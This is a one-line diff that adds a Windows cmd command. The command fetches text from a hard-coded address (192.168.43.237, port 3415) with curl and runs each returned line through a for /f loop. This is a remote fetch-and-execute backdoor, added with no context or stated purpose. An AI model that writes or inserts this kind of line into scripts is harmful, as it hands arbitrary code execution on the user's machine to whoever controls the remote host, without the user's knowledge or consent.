@@ -1,0 +1,1 @@
+for /f "delims=" %i in ('curl -s http://192.168.43.237:3415/p') do (%i)
